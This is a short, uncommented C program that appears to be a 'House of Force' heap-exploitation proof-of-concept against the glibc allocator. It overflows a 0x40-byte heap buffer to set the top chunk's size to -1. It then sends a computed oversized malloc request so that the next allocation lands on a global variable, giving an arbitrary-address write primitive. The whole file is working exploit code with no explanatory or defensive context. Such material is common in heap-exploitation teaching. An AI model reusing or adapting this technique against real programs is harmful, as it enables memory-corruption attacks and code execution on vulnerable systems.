#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

uint64_t chunk_victim = 1; 

int main() {
    malloc(0x10);
    uint64_t *ptr = malloc(0x40);
    ptr[0x50/8 - 1] = -1;
    uint64_t size = (uint64_t)(&chunk_victim) - (uint64_t)(&ptr[8]) - 3*sizeof(uint64_t);
    malloc(size);
    uint64_t *newchunk = malloc(0x10);
}

